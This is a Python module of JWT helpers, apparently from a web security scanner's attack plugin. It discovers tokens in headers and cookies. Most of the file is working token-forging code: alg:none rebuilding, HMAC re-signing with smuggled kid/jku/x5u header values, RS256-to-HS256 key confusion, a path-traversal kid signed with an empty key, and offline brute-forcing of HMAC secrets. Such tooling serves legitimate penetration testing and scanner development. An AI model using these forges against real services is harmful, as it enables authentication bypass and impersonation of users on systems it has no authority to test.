"""JWT discovery, inspection and tampering helpers.

Kept separate from the attack plugin so the low-level token surgery is unit
testable without a live target. Uses PyJWT for inspection/decoding; the couple
of forges PyJWT deliberately refuses (an ``alg:none`` token, or an HS256 token
signed with an RSA *public* key for the algorithm-confusion attack) are built
by hand with base64url + HMAC — that hand-rolling is precisely the bug class
these tests exercise.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass

import jwt as pyjwt


@dataclass
class TokenLocation:
    """Where a discovered JWT lives, so a tampered value can be replayed there.

    ``kind`` is ``"header"`` or ``"cookie"``; ``name`` is the header/cookie
    name; ``prefix`` is any scheme prefix to preserve when re-sending (e.g.
    ``"Bearer "`` for an ``Authorization`` header); ``token`` is the raw JWT.
    """

    kind: str
    name: str
    prefix: str
    token: str


def discover_tokens(headers: dict | None, cookies: dict | None) -> list["TokenLocation"]:
    """Find JWTs among request headers and cookies.

    Handles ``Authorization: Bearer <jwt>`` (preserving the ``Bearer`` prefix),
    bare JWT header values, and cookie values that are JWTs.
    """
    found: list[TokenLocation] = []
    for name, value in (headers or {}).items():
        if not isinstance(value, str):
            continue
        prefix, candidate = "", value.strip()
        if candidate.lower().startswith("bearer "):
            prefix, candidate = candidate[:7], candidate[7:].strip()
        if looks_like_jwt(candidate):
            found.append(TokenLocation("header", name, prefix, candidate))
    for name, value in (cookies or {}).items():
        if isinstance(value, str) and looks_like_jwt(value):
            found.append(TokenLocation("cookie", name, "", value))
    return found


# HMAC algorithms we can brute-force / re-sign offline.
_HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def b64url_decode(segment: str) -> bytes:
    """Decode a base64url segment, tolerating missing padding."""
    if isinstance(segment, bytes):
        segment = segment.decode("ascii")
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(raw: bytes) -> str:
    """Encode bytes as unpadded base64url (JWT wire format)."""
    if isinstance(raw, str):
        raw = raw.encode("utf-8")
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def looks_like_jwt(token: str) -> bool:
    """True when ``token`` parses as a JWT (three parts, JSON header w/ alg)."""
    if not isinstance(token, str) or token.count(".") != 2:
        return False
    try:
        header = pyjwt.get_unverified_header(token)
    except Exception:
        return False
    return "alg" in header


def decode_header(token: str) -> dict:
    return pyjwt.get_unverified_header(token)


def decode_claims(token: str) -> dict:
    """Return the (unverified) claim set."""
    try:
        return pyjwt.decode(token, options={"verify_signature": False})
    except Exception:
        # Fall back to a raw decode if PyJWT rejects the claims shape.
        return json.loads(b64url_decode(token.split(".")[1]))


def _encode_segment(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


def _hmac_sign(signing_input: bytes, secret: bytes, alg: str) -> bytes:
    digest = _HMAC_ALGS[alg]
    return hmac.new(secret, signing_input, digest).digest()


def forge_alg_none(token: str, claims: dict | None = None) -> str:
    """Rebuild ``token`` with ``alg:none`` and an empty signature.

    The original claims are preserved unless ``claims`` overrides them. Several
    ``none`` spellings exist in the wild; this uses lowercase ``none`` (callers
    that want to probe casing can pass a pre-mangled header via ``claims``).
    """
    header = decode_header(token)
    header["alg"] = "none"
    payload = claims if claims is not None else decode_claims(token)
    return f"{_encode_segment(header)}.{_encode_segment(payload)}."


def forge_hmac(token: str, secret: bytes, alg: str = "HS256",
               header_extra: dict | None = None,
               claims: dict | None = None) -> str:
    """Re-sign ``token`` as an HMAC (``alg``) token using ``secret``.

    ``header_extra`` merges into the JWT header (used to smuggle a ``kid`` /
    ``jku`` / ``x5u`` value); ``claims`` overrides the payload. This underpins
    both the weak-secret forge and the RS256->HS256 confusion forge (where the
    "secret" is the server's PEM public key).
    """
    header = decode_header(token)
    header["alg"] = alg
    if header_extra:
        header.update(header_extra)
    payload = claims if claims is not None else decode_claims(token)
    signing_input = f"{_encode_segment(header)}.{_encode_segment(payload)}"
    signature = _hmac_sign(signing_input.encode("ascii"), secret, alg)
    return f"{signing_input}.{b64url_encode(signature)}"


def forge_confusion(token: str, public_key_pem: str,
                    alg: str = "HS256") -> str:
    """RS256->HS256 confusion: HMAC-sign using the RSA public key as the secret."""
    return forge_hmac(token, public_key_pem.encode("utf-8"), alg=alg)


def forge_kid_empty(token: str, kid: str = "../../../../../../../../dev/null",
                    alg: str = "HS256") -> str:
    """Set a path-traversal ``kid`` and sign with an empty key.

    Libraries that resolve ``kid`` to a file (e.g. ``/dev/null``) and use its
    contents as the verification key end up verifying against an empty secret,
    so an empty-key HMAC token is accepted.
    """
    return forge_hmac(token, b"", alg=alg, header_extra={"kid": kid})


def brute_hmac_secret(token: str, candidates) -> str | None:
    """Offline HMAC secret recovery: return the first candidate that verifies.

    Only meaningful for HS* tokens; returns ``None`` for asymmetric algorithms
    or when no candidate matches.
    """
    try:
        alg = decode_header(token).get("alg", "")
    except Exception:
        return None
    if alg not in _HMAC_ALGS:
        return None
    try:
        signing_input, signature = token.rsplit(".", 1)
        expected = b64url_decode(signature)
    except Exception:
        return None
    signing_bytes = signing_input.encode("ascii")
    for candidate in candidates:
        secret = candidate.encode("utf-8") if isinstance(candidate, str) else candidate
        actual = _hmac_sign(signing_bytes, secret, alg)
        if hmac.compare_digest(actual, expected):
            return candidate if isinstance(candidate, str) else candidate.decode(
                "utf-8", "replace"
            )
    return None


def is_hmac_alg(token: str) -> bool:
    try:
        return decode_header(token).get("alg", "") in _HMAC_ALGS
    except Exception:
        return False


def is_rsa_alg(token: str) -> bool:
    try:
        return decode_header(token).get("alg", "").startswith(("RS", "PS"))
    except Exception:
        return False
